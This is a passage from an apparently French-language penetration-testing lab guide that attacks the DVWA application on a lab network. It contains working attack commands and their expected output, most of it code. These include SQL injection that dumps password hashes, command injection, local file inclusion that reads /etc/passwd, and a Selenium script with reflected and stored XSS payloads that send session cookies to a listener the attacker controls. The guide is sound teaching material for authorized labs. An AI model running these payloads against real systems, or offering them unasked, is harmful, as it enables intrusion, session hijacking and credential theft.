prouve "$OUT/09-sqlmap-dbs.txt" bash -c "timeout 300 sqlmap -u '$BASE/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='$COOKIE_HEADER' --batch --flush-session --output-dir='$OUT/sqlmap' --dbs 2>&1"
prouve "$OUT/10-sqlmap-tables.txt" bash -c "timeout 300 sqlmap -u '$BASE/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='$COOKIE_HEADER' --batch --output-dir='$OUT/sqlmap' -D dvwa --tables 2>&1"
prouve "$OUT/11-sqlmap-dump-users.txt" bash -c "timeout 300 sqlmap -u '$BASE/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='$COOKIE_HEADER' --batch --answers=crack=N --output-dir='$OUT/sqlmap' -D dvwa -T users -C user,password --dump --start 1 --stop 5 2>&1"
```

**`xss-browser-test.py`** — lance un listener HTTP sur `0.0.0.0:8000`, se connecte à DVWA dans Chromium, force le niveau `low`, injecte un XSS réfléchi puis un XSS stocké, et journalise les cookies reçus.

```python
#!/usr/bin/env python3
# xss-browser-test.py — prouve l'exécution XSS dans un vrai navigateur.
# Phase MITRE ATT&CK : T1190 (application web), T1059.007 (JavaScript),
# T1539 (vol de cookie de session) et T1048 (exfiltration vers Kali).
#
# Le script démarre un listener HTTP sur Kali:8000, pilote Chromium avec
# Selenium, se connecte à DVWA, force `security=low`, injecte un XSS
# réfléchi puis un XSS stocké, et journalise les requêtes reçues.
# Le listener ne fait que journaliser : aucun cookie n'est réutilisé.

import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select, WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoAlertPresentException

# Cible et callback : la cible est Metasploitable 2, le callback est Kali.
# Le listener doit être joignable depuis la cible sur le réseau host-only.
BASE = "http://192.168.56.103/dvwa"
CALLBACK = "http://192.168.56.101:8000"
requests_seen = []


class Handler(BaseHTTPRequestHandler):
    """Réceptionne les requêtes déclenchées par le JavaScript injecté."""

    def do_GET(self):
        # On conserve le chemin complet : il contient le cookie encodé.
        requests_seen.append(self.path)
        # 204 évite d'envoyer un corps et de perturber le navigateur.
        self.send_response(204)
        self.end_headers()

    def log_message(self, *args):
        # Le log par défaut est trop bruyant pour une preuve lisible.
        pass


# Listener de callback en arrière-plan, sur toutes les interfaces.
server = HTTPServer(("0.0.0.0", 8000), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()


def dismiss_alerts(driver, timeout=3):
    """Ferme les alertes DVWA/historique pour ne pas bloquer le navigateur."""
    end = time.time() + timeout
    while time.time() < end:
        try:
            driver.switch_to.alert.accept()
            time.sleep(0.2)
        except NoAlertPresentException:
            break


# Chromium sans interface graphique, avec les options compatibles conteneur.
opts = Options()
opts.add_argument("--headless=new")
opts.add_argument("--no-sandbox")
opts.add_argument("--disable-dev-shm-usage")
driver = webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=opts)
driver.set_page_load_timeout(20)

# 1) Login DVWA et vérification de la redirection vers index.php.
driver.get(BASE + "/login.php")
dismiss_alerts(driver)
driver.find_element(By.NAME, "username").send_keys("admin")
driver.find_element(By.NAME, "password").send_keys("password")
driver.find_element(By.NAME, "Login").click()
WebDriverWait(driver, 10).until(EC.url_contains("index.php"))
print("LOGIN_URL:", driver.current_url)

# 2) Passage au niveau `low` : sans ce changement, les payloads sont filtrés.
driver.get(BASE + "/security.php")
dismiss_alerts(driver)
Select(driver.find_element(By.NAME, "security")).select_by_value("low")
driver.find_element(By.NAME, "seclev_submit").click()
time.sleep(1)
print("SECURITY_COOKIE:", [c for c in driver.get_cookies() if c["name"] == "security"])

# 3) XSS réfléchi : le payload construit une requête GET vers Kali.
# `document.cookie` est encodé pour rester dans le paramètre `c`.
reflected = "<script>new Image().src='" + CALLBACK + "/reflected?c='+encodeURIComponent(document.cookie)</script>"
driver.get(BASE + "/vulnerabilities/xss_r/?name=" + urllib.parse.quote(reflected, safe=""))
dismiss_alerts(driver)
time.sleep(3)

# 4) XSS stocké : on remplit les deux champs par JavaScript pour contourner
# la limite `maxlength` du formulaire, puis on soumet le guestbook.
driver.get(BASE + "/vulnerabilities/xss_s/")
dismiss_alerts(driver)
stored = "<script>new Image().src='" + CALLBACK + "/stored?c='+encodeURIComponent(document.cookie)</script>"
driver.execute_script("document.getElementsByName('txtName')[0].value='xss';")
driver.execute_script("document.getElementsByName('mtxMessage')[0].value=arguments[0];", stored)
driver.find_element(By.NAME, "btnSign").click()
time.sleep(2)
dismiss_alerts(driver)
time.sleep(3)

# 5) Relecture de la page : le payload stocké s'exécute à nouveau.
driver.get(BASE + "/vulnerabilities/xss_s/")
dismiss_alerts(driver)
time.sleep(3)

# 6) Bilan : chaque chemin de callback et chaque cookie exfiltré.
print("CALLBACK_REQUESTS:", len(requests_seen))
for path in requests_seen:
    print("CALLBACK_PATH:", path)
    parsed = urllib.parse.urlparse(path)
    query = urllib.parse.parse_qs(parsed.query)
    if "c" in query:
        print("EXFILTRATED_COOKIE:", query["c"][0])

# 7) Nettoyage : le navigateur et le listener sont arrêtés.
driver.quit()
server.shutdown()
```

**Exemple de commande**

```bash
mkdir -p ~/preuves/ch1-lab8-v3
cd ~/preuves/ch1-lab8-v3
chmod +x web-tests.sh xss-browser-test.py
python3 -m py_compile xss-browser-test.py
bash -n web-tests.sh
sha256sum web-tests.sh xss-browser-test.py | tee SHA256SUMS
```

**Explication de la commande**

- `mkdir -p ~/preuves/ch1-lab8-v3` : crée le répertoire de travail.
- `cd ~/preuves/ch1-lab8-v3` : place le shell dans ce répertoire.
- `chmod +x` : rend les deux scripts exécutables.
- `python3 -m py_compile xss-browser-test.py` : vérifie la syntaxe Python sans exécuter le script.
- `bash -n web-tests.sh` : vérifie la syntaxe Bash sans exécuter le script.
- `sha256sum ... | tee SHA256SUMS` : calcule, affiche et enregistre les deux empreintes.
- `python3 -m py_compile` crée `__pycache__` ; ce n'est pas une preuve d'exploitation, seulement une vérification de syntaxe.
- Piège courant : modifier un script après le calcul des empreintes ; le hash ne correspond plus.

**Explication des scripts**

- `web-tests.sh` commence par `set -u` : toute variable non définie provoque une erreur.
- `source "$HOME/prouve.sh"` : charge la fonction de preuve.
- `BASE`, `OUT`, `COOKIE` : fixent l'URL DVWA, le répertoire de sortie et le cookie jar.
- `mkdir -p "$OUT"` : crée le répertoire des preuves.
- `01-login` : `curl -D -` affiche les en-têtes, `-c` écrit le cookie jar et `-b` le renvoie ; `grep` extrait `HTTP/`, `Location` et `Set-Cookie`.
- `02-security-low` : envoie `security=low` et vérifie le cookie `security`.
- `03-sqli-union` : injecte `UNION SELECT user,password FROM users#` et extrait le bloc `<pre>`.
- `04-xss-reflected` : envoie `<script>alert(document.cookie)</script>` et vérifie qu'il revient sans échappement.
- `05-xss-stored-submit` et `06-xss-stored-view` : écrivent le payload dans le guestbook, puis relisent la page.
- `07-cmdi` : injecte `127.0.0.1; id; hostname; uname -a` dans le formulaire `ping`.
- `08-lfi` : lit `/etc/passwd` par `page=../../../../../etc/passwd`.
- `09` à `11` : `PHPSESSID` et `security` sont extraits du cookie jar, puis SQLmap liste les bases, les tables et dumpe cinq comptes avec `--answers=crack=N`.
- `xss-browser-test.py` démarre un `HTTPServer` sur `0.0.0.0:8000` et journalise chaque requête dans `requests_seen`.
- `Handler.do_GET` : enregistre le chemin, qui contient le cookie encodé, et retourne `204`.
- `dismiss_alerts` : accepte les alertes DVWA sans bloquer Chromium.
- `webdriver.Chrome` avec `--headless=new` : exécute JavaScript dans un navigateur réel sans écran.
- Le script se connecte, force `security=low`, injecte le XSS réfléchi, remplit le guestbook par `execute_script` pour contourner `maxlength`, puis relit la page stockée.
- `print("EXFILTRATED_COOKIE:")` : affiche le cookie reçu par le listener.
- `driver.quit()` et `server.shutdown()` : arrêtent le navigateur et le listener.
- Piège courant : lancer le script sans `chromedriver` dans le `PATH` ; Chromium ne démarre pas.

**Résultat attendu**

Aucune erreur de syntaxe, deux empreintes SHA-256.

**Preuve** — `preuves/ch1-lab8-v3/web-tests.sh`, `xss-browser-test.py` et `SHA256SUMS`.

#### Étape 3 — Login et niveau de sécurité `low`

**But** — obtenir un cookie de session DVWA, forcer le niveau `low` et enregistrer les deux preuves.

**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.

**Prérequis** — DVWA accessible, compte `admin`/`password`, scripts de l'étape 2.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`

**Exemple de commande**

```bash
prouve 01-login.txt bash -c "curl -sS -D - -c cookies.txt -b cookies.txt -d 'username=admin&password=password&Login=Login' 'http://192.168.56.103/dvwa/login.php' -o /tmp/dvwa-login-v3.html | grep -i -E 'HTTP/|Location|Set-Cookie'; grep -o 'PHPSESSID[^;]*' cookies.txt"
prouve 02-security-low.txt bash -c "curl -sS -b cookies.txt -c cookies.txt -d 'security=low&seclev_submit=Submit' 'http://192.168.56.103/dvwa/security.php' -o /tmp/dvwa-security-v3.html; grep -E 'security[[:space:]]+low' cookies.txt; grep -o 'Security Level:</b> [a-z]*' /tmp/dvwa-security-v3.html | head -1"
```

**Explication de la commande**

- `prouve 01-login.txt` : enregistre le login et son code retour.
- `curl -sS` : mode silencieux, mais affiche les erreurs.
- `-D -` : affiche les en-têtes de réponse, dont le `302` et `Location`.
- `-c cookies.txt` : écrit le cookie jar.
- `-b cookies.txt` : renvoie le cookie jar.
- `-d 'username=admin&password=password&Login=Login'` : envoie le formulaire de login en POST.
- `-o /tmp/dvwa-login-v3.html` : enregistre le corps de la réponse.
- `grep -i -E 'HTTP/|Location|Set-Cookie'` : extrait les lignes utiles du login.
- `grep -o 'PHPSESSID[^;]*'` : confirme la présence du cookie de session.
- `prouve 02-security-low.txt` : enregistre le changement de niveau.
- `-d 'security=low&seclev_submit=Submit'` : envoie le formulaire `security.php`.
- `grep -E 'security[[:space:]]+low' cookies.txt` : vérifie que le cookie `security` vaut `low`.
- `grep -o 'Security Level:</b> [a-z]*' ... | head -1` : vérifie le niveau affiché dans la page.
- Piège courant : DVWA peut définir `security=high` au login. Si vous ne visitez pas `security.php`, les tests SQLi/XSS échouent ou sont filtrés.

**Résultat attendu**

```text
HTTP/1.1 302 Found
Location: index.php
PHPSESSID	a6a5b4533db6af4ebd55f1a1ab706804
192.168.56.103	FALSE	/dvwa	FALSE	0	security	low
# rc=0
```

**Preuve** — `01-login.txt` et `02-security-low.txt` avec `# rc=0`.

#### Étape 4 — SQL injection manuelle : UNION SELECT

**But** — prouver la SQLi avec une requête contrôlée et extraire les comptes de la table `users`.

**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.

**Prérequis** — session `admin`, `security=low`, table `users` à deux colonnes.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`

**Exemple de commande**

```bash
prouve 03-sqli-union.txt bash -c "curl -sS -b cookies.txt -G --data-urlencode \"id=1' UNION SELECT user,password FROM users#\" --data-urlencode 'Submit=Submit' 'http://192.168.56.103/dvwa/vulnerabilities/sqli/' | grep -o '<pre>ID:.*</pre>' | head -5"
```

**Explication de la commande**

- `prouve 03-sqli-union.txt` : enregistre la requête et son code retour.
- `curl -sS -b cookies.txt` : interroge DVWA avec la session authentifiée.
- `-G` : place les données en query string, comme le formulaire DVWA.
- `--data-urlencode "id=1' UNION SELECT user,password FROM users#"` : encode la charge SQL.
- `id=1` : valeur normale ; la requête renvoie l'utilisateur 1.
- `'` : ferme la chaîne SQL et permet d'injecter une clause.
- `UNION SELECT user,password FROM users` : ajoute les lignes de la table `users` aux deux colonnes de la requête d'origine.
- `#` : commente la fin de la requête et neutralise la clause restante.
- `--data-urlencode` : encode `'`, l'espace et `#` ; sans cela, `#` serait interprété comme un fragment d'URL.
- `grep -o '<pre>ID:.*</pre>'` : extrait les blocs de résultat.
- `head -5` : limite l'affichage aux cinq premiers blocs.
- Piège courant : si la page ne renvoie qu'un seul utilisateur, vérifiez que `#` est bien encodé (`%23`) et que le niveau est `low`. Faites d'abord la requête `UNION`, puis SQLmap.

**Résultat attendu**

```html
<pre>ID: 1' UNION SELECT user,password FROM users#<br>First name: admin<br>Surname: admin</pre>
<pre>ID: 1' UNION SELECT user,password FROM users#<br>First name: admin<br>Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
<pre>ID: 1' UNION SELECT user,password FROM users#<br>First name: gordonb<br>Surname: e99a18c428cb38d5f260853678922e03</pre>
<pre>ID: 1' UNION SELECT user,password FROM users#<br>First name: 1337<br>Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</pre>
<pre>ID: 1' UNION SELECT user,password FROM users#<br>First name: pablo<br>Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</pre>
<pre>ID: 1' UNION SELECT user,password FROM users#<br>First name: smithy<br>Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
```

La réponse HTTP contient les noms et les hashes MD5 de la table `users`. Le hash `5f4dcc3b5aa765d61d8327deb882cf99` correspond au mot de passe de lab `password` ; les autres hashes sont visibles. Le lab ne cherche pas à casser les hashes : la lecture est la preuve.

**Preuve** — `03-sqli-union.txt` avec `# rc=0`.

#### Étape 5 — SQLmap et exfiltration de la base `dvwa`

**But** — automatiser la découverte, lister les bases et les tables, puis dumper les comptes sans cracking.

**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.

**Prérequis** — cookie `PHPSESSID` et `security=low` extraits du cookie jar.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`

**Exemple de commande**

```bash
PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt)
SECURITY=$(awk '$6=="security"{print $7}' cookies.txt)
COOKIE_HEADER="PHPSESSID=$PHPSESSID; security=$SECURITY"

prouve 09-sqlmap-dbs.txt timeout 300 sqlmap \
  -u 'http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie="$COOKIE_HEADER" --batch --flush-session \
  --output-dir="$HOME/preuves/ch1-lab8-v3/sqlmap" --dbs

prouve 10-sqlmap-tables.txt timeout 300 sqlmap \
  -u 'http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie="$COOKIE_HEADER" --batch \
  --output-dir="$HOME/preuves/ch1-lab8-v3/sqlmap" -D dvwa --tables

prouve 11-sqlmap-dump-users.txt timeout 300 sqlmap \
  -u 'http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie="$COOKIE_HEADER" --batch --answers=crack=N \
  --output-dir="$HOME/preuves/ch1-lab8-v3/sqlmap" \
  -D dvwa -T users -C user,password --dump --start 1 --stop 5
```

**Explication de la commande**

- `PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt)` : extrait la valeur du cookie de session.
- `SECURITY=$(awk '$6=="security"{print $7}' cookies.txt)` : extrait la valeur du cookie `security`.
- `COOKIE_HEADER="PHPSESSID=$PHPSESSID; security=$SECURITY"` : reconstruit l'en-tête `Cookie` attendu par DVWA.
- `prouve 09-sqlmap-dbs.txt` : enregistre la première exécution SQLmap.
- `timeout 300` : borne chaque exécution à 300 secondes.
- `-u '...'` : URL cible avec le paramètre `id` injectable.
- `--cookie="$COOKIE_HEADER"` : réutilise la session DVWA ; sans cookie, la page redirige vers le login.
- `--batch` : accepte les réponses par défaut, sans interaction.
- `--flush-session` : repart d'un état propre et évite un cache incohérent.
- `--output-dir="$HOME/preuves/ch1-lab8-v3/sqlmap"` : conserve les logs et les CSV.
- `--dbs` : liste les bases et prouve la portée de la lecture.
- `-D dvwa --tables` : cible la base applicative et liste ses tables.
- `-D dvwa -T users -C user,password` : limite le dump aux colonnes des comptes.
- `--dump --start 1 --stop 5` : extrait les lignes 1 à 5, soit les cinq comptes.
- `--answers=crack=N` : refuse le cracking ; le lab prouve l'exfiltration, pas le cassage.
- Piège courant : si SQLmap ne détecte rien, vérifiez le cookie `security=low` et l'URL exacte avec `Submit=Submit`. Si SQLmap propose de cracker et que vous répondez `Y`, la preuve devient énorme et le lab sort de son périmètre.

**Résultat attendu**

```text
available databases [7]:
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195

Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+

Database: dvwa
Table: users
[5 entries]
+---------+----------------------------------+
| user    | password                         |
+---------+----------------------------------+
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+----------------------------------+
```

Le dump contient des hashes MD5. Cracker les hashes serait une attaque de force brute ou de dictionnaire, hors périmètre et inutile pour la preuve : la lecture de la table est déjà une exfiltration. Le hash `admin` correspond au mot de passe de lab connu, ce qui illustre la faiblesse du stockage MD5 non salé, mais le lab s'arrête à la démonstration.

**Preuve** — `09-sqlmap-dbs.txt`, `10-sqlmap-tables.txt`, `11-sqlmap-dump-users.txt`, avec `# rc=0`.

#### Étape 6 — XSS réfléchi

**But** — prouver qu'un paramètre est renvoyé sans encodage et qu'un script peut s'exécuter dans le navigateur.

**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.

**Prérequis** — session `admin`, `security=low`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`

**Exemple de commande**

```bash
prouve 04-xss-reflected.txt bash -c "curl -sS -b cookies.txt -G --data-urlencode 'name=<script>alert(document.cookie)</script>' 'http://192.168.56.103/dvwa/vulnerabilities/xss_r/' | grep -o '<script>alert(document.cookie)</script>' | head -1"
```

**Explication de la commande**

- `prouve 04-xss-reflected.txt` : enregistre la requête et son code retour.
- `curl -sS -b cookies.txt` : interroge DVWA avec la session authentifiée.
- `-G` : place le paramètre en query string, comme le formulaire.
- `--data-urlencode 'name=...'` : encode le payload pour ne pas casser l'URL.
- `name=` : paramètre réfléchi ; DVWA réaffiche la valeur dans la page.
- `<script>` : balise interprétée comme du JavaScript par le navigateur.
- `alert(document.cookie)` : lit le cookie de session et démontre l'accès.
- `grep -o '<script>alert(document.cookie)</script>'` : vérifie que le payload revient sans échappement.
- `head -1` : limite l'affichage à une occurrence.
- Piège courant : si la réponse contient `&lt;script&gt;`, le niveau n'est pas `low` ou un filtre est actif. Ne concluez pas « XSS » sur une simple présence de texte : vérifiez que `<` et `>` sont bruts.

**Résultat attendu**

```html
<script>alert(document.cookie)</script>
```

La preuve `curl` montre que le serveur renvoie le payload **sans échappement**. Elle ne prouve pas à elle seule l'exécution, car `curl` n'exécute pas JavaScript. L'étape 10 de ce lab exécute le même type de payload dans Chromium et prouve l'exécution par un callback contenant le cookie.

**Preuve** — `04-xss-reflected.txt` avec `# rc=0`.

#### Étape 7 — XSS stocké

**But** — prouver qu'un payload est stocké dans le guestbook et réexécuté à chaque visite.

**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.

**Prérequis** — session `admin`, `security=low`, guestbook accessible.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`

**Exemple de commande**

```bash
prouve 05-xss-stored-submit.txt bash -c "curl -sS -b cookies.txt --data-urlencode \"txtName=<script>alert(1)</script>\" --data-urlencode 'mtxMessage=stored-xss-proof' --data-urlencode 'btnSign=Sign Guestbook' 'http://192.168.56.103/dvwa/vulnerabilities/xss_s/' | grep -o '<script>alert(1)</script>' | head -1"
prouve 06-xss-stored-view.txt bash -c "curl -sS -b cookies.txt 'http://192.168.56.103/dvwa/vulnerabilities/xss_s/' | grep -o '<script>alert(1)</script>' | head -1"
```

**Explication de la commande**

- `prouve 05-xss-stored-submit.txt` : enregistre la soumission du guestbook.
- `curl -sS -b cookies.txt` : utilise la session authentifiée.
- `--data-urlencode "txtName=<script>alert(1)</script>"` : écrit le payload dans le nom du visiteur.
- `mtxMessage=stored-xss-proof` : ajoute un message lisible pour retrouver l'entrée.
- `btnSign=Sign Guestbook` : déclenche l'insertion.
- `grep -o '<script>alert(1)</script>'` : vérifie que le payload est présent dans la réponse.
- `prouve 06-xss-stored-view.txt` : enregistre la relecture de la page.
- Le second `curl` relit la page sans renvoyer le formulaire : il prouve la persistance, pas seulement la réflexion.
- `head -1` : limite l'affichage à une occurrence.
- Piège courant : le champ `txtName` a un `maxlength="10"` et `mtxMessage` un `maxlength="50"`. Le test `curl` contourne le contrôle client ; le test navigateur de l'étape 10 utilise `execute_script` pour illustrer le même bypass.

**Résultat attendu**

```html
<script>alert(1)</script>
```

Le payload n'est pas seulement dans l'URL : il est enregistré et exécuté pour chaque visiteur de la page. Un attaquant n'a pas besoin de convaincre la victime de cliquer sur un lien spécial : la page légitime exécute le script.

**Preuve** — `05-xss-stored-submit.txt` et `06-xss-stored-view.txt` avec `# rc=0`.

#### Étape 8 — Injection de commande

**But** — prouver qu'un paramètre est passé à un shell et exécuter des commandes avec l'utilisateur du serveur web.

**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.

**Prérequis** — session `admin`, `security=low`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`

**Exemple de commande**

```bash
prouve 07-cmdi.txt bash -c "curl -sS -b cookies.txt --data-urlencode 'ip=127.0.0.1; id; hostname; uname -a' --data-urlencode 'submit=submit' 'http://192.168.56.103/dvwa/vulnerabilities/exec/' | sed -n '/<pre>/,/<\/pre>/p' | head -20"
```

**Explication de la commande**

- `prouve 07-cmdi.txt` : enregistre la requête et son code retour.
- `curl -sS -b cookies.txt` : utilise la session authentifiée.
- `--data-urlencode 'ip=127.0.0.1; id; hostname; uname -a'` : envoie une valeur valide suivie de commandes.
- `ip=127.0.0.1` : valeur valide qui passe le contrôle de format.
- `;` : sépare les commandes et permet d'exécuter la suite.
- `id` : prouve l'utilisateur `www-data`.
- `hostname` : prouve l'exécution locale.
- `uname -a` : complète la preuve par la version du noyau.
- `submit=submit` : déclenche le formulaire.
- `sed -n '/<pre>/,/<\/pre>/p'` : extrait le bloc de sortie du formulaire.
- `head -20` : limite l'affichage à vingt lignes.
- Piège courant : si le formulaire échappe `;`, essayez `|` ou `&&` uniquement si le niveau est `low` et si le lab l'autorise. Ne lancez pas de commande destructive (`rm`, `shutdown`, modification de fichier) : la preuve est `id`, `hostname`, `uname`.

**Résultat attendu**

```text
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.010 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

Apache/PHP tourne sous `www-data`. L'injection de commande donne les droits du processus web, pas ceux de root. Une élévation locale serait une autre étape, hors périmètre.

**Preuve** — `07-cmdi.txt` avec `# rc=0`.

#### Étape 9 — Inclusion de fichier local

**But** — prouver qu'un paramètre de page permet de lire un fichier hors du répertoire prévu.

**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.

**Prérequis** — session `admin`, `security=low`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`

**Exemple de commande**

```bash
prouve 08-lfi.txt bash -c "curl -sS -b cookies.txt -G --data-urlencode 'page=../../../../../etc/passwd' 'http://192.168.56.103/dvwa/vulnerabilities/fi/' | grep -E 'root:|msfadmin:' | head -2"
```

**Explication de la commande**

- `prouve 08-lfi.txt` : enregistre la requête et son code retour.
- `curl -sS -b cookies.txt` : utilise la session authentifiée.
- `-G` : place le paramètre en query string.
- `--data-urlencode 'page=../../../../../etc/passwd'` : encode le chemin de traversée.
- `page=` : paramètre d'inclusion ; DVWA inclut le fichier indiqué.
- `../../../../../` : remonte les répertoires pour quitter le répertoire du lab.
- `/etc/passwd` : fichier lisible, preuve non destructive.
- `grep -E 'root:|msfadmin:'` : extrait les comptes significatifs.
- `head -2` : limite l'affichage à deux lignes.
- Piège courant : certains serveurs interdisent `..` ou utilisent `open_basedir`. Ici, le niveau `low` les autorise. La mitigation est une allowlist de fichiers et la désactivation des wrappers PHP dangereux.

**Résultat attendu**

```text
root:x:0:0:root:/root:/bin/bash
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
```

Le script DVWA est dans un sous-répertoire profond ; cinq remontées atteignent la racine. Le nombre exact dépend de la configuration. Si cinq ne suffisent pas, testez six ou sept, mais documentez le chemin qui fonctionne ; ne concluez pas à une absence de LFI sur un seul essai.

**Preuve** — `08-lfi.txt` avec `# rc=0`.

#### Étape 10 — XSS réel dans Chromium et exfiltration du cookie

**But** — prouver l'exécution JavaScript et l'exfiltration du cookie de session dans un navigateur réel, pour le XSS réfléchi et le XSS stocké.

**Machine** — Kali `192.168.56.101` (navigateur et listener) vers DVWA `192.168.56.103`.

**Prérequis** — `selenium`, `chromium`, `chromedriver`, port `8000/tcp` libre, session `admin`/`password`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`

**Exemple de commande**

```bash
prouve 12-xss-browser.txt timeout 120 python3 xss-browser-test.py
```

**Explication de la commande**

- `prouve 12-xss-browser.txt` : enregistre la sortie du test navigateur et son code retour.
- `timeout 120` : borne l'exécution à 120 secondes.
- `python3 xss-browser-test.py` : lance le script Selenium.
- `HTTPServer(("0.0.0.0", 8000), Handler)` : listener de callback qui reçoit les requêtes déclenchées par le JavaScript.
- `do_GET` et `requests_seen.append` : journalisent le chemin contenant le cookie.
- `webdriver.Chrome(... /usr/bin/chromedriver)` : navigateur réel qui exécute JavaScript comme une victime.
- `--headless=new` : mode sans fenêtre, reproductible sur Kali sans écran.
- `driver.get(login.php)` et `send_keys` : login et obtention du cookie de session.
- `Select(...).select_by_value("low")` : force le niveau DVWA.
- `urllib.parse.quote(reflected, safe="")` : encode le payload `<script>` dans l'URL.
- `new Image().src='...'+document.cookie` : exfiltre le cookie vers le listener.
- `execute_script(... mtxMessage ...)` : contourne `maxlength`, car le contrôle client ne doit pas être la seule défense.
- `dismiss_alerts` : accepte les alertes du guestbook.
- `print("EXFILTRATED_COOKIE:")` : affiche le cookie complet reçu.
- `driver.quit()` et `server.shutdown()` : arrêtent le navigateur et le listener.
- Piège courant : si `CALLBACK_REQUESTS` vaut `0`, vérifiez que le listener écoute sur `0.0.0.0:8000`, que Kali peut joindre `192.168.56.101:8000` depuis le navigateur et que le payload n'est pas filtré.

**Résultat attendu**

```text
LOGIN_URL: http://192.168.56.103/dvwa/index.php
SECURITY_COOKIE: [{'domain': '192.168.56.103', 'httpOnly': False, 'name': 'security', 'path': '/dvwa', 'sameSite': 'Lax', 'secure': False, 'value': 'low'}]
CALLBACK_REQUESTS: 4
CALLBACK_PATH: /reflected?c=security%3Dlow%3B%20PHPSESSID%3D155b8a11893786acc1c06cb64f65343c
EXFILTRATED_COOKIE: security=low; PHPSESSID=155b8a11893786acc1c06cb64f65343c
CALLBACK_PATH: /stored?c=security%3Dlow%3B%20PHPSESSID%3D155b8a11893786acc1c06cb64f65343c
EXFILTRATED_COOKIE: security=low; PHPSESSID=155b8a11893786acc1c06cb64f65343c
CALLBACK_PATH: /stored?c=security%3Dlow%3B%20PHPSESSID%3D155b8a11893786acc1c06cb64f65343c
EXFILTRATED_COOKIE: security=low; PHPSESSID=155b8a11893786acc1c06cb64f65343c
# rc=0
```

`curl` ne fait qu'afficher le HTML. Chromium exécute le script, construit une requête vers `192.168.56.101:8000` et transmet `document.cookie`. La ligne `EXFILTRATED_COOKIE` prouve l'exécution et la lecture du cookie. Le cookie est un cookie de lab ; il est invalidé par la restauration du snapshot et ne doit pas être réutilisé. Si Chromium ne démarre pas, vérifiez `chromedriver --version` et la variable `PATH`. Si une alerte bloque la page, `dismiss_alerts` doit l'accepter ; sinon, le script peut expirer.

**Preuve** — `12-xss-browser.txt`. `00-suite.txt` exécute `web-tests.sh` puis le test navigateur et contient les sorties des deux.

#### Étape 11 — Archiver les preuves sur l'hôte

**But** — copier les preuves de Kali vers l'hôte et vérifier leur intégrité par empreinte SHA-256.

**Machine** — hôte (hyperviseur).

**Prérequis** — preuves des étapes 1 à 10 présentes sur Kali ; accès SSH à Kali.

> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : votre compte | **Répertoire** : racine du projet `hacking-contre-mesure-niveau-2`

**Exemple de commande**

```bash
mkdir -p preuves/ch1-lab8-v3
scp -r kali@192.168.56.101:/home/kali/preuves/ch1-lab8-v3/. preuves/ch1-lab8-v3/
find preuves/ch1-lab8-v3 -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 sha256sum > preuves/ch1-lab8-v3/SHA256SUMS
sha256sum -c preuves/ch1-lab8-v3/SHA256SUMS
```

**Explication de la commande**

- `mkdir -p preuves/ch1-lab8-v3` : crée le répertoire d'archivage.
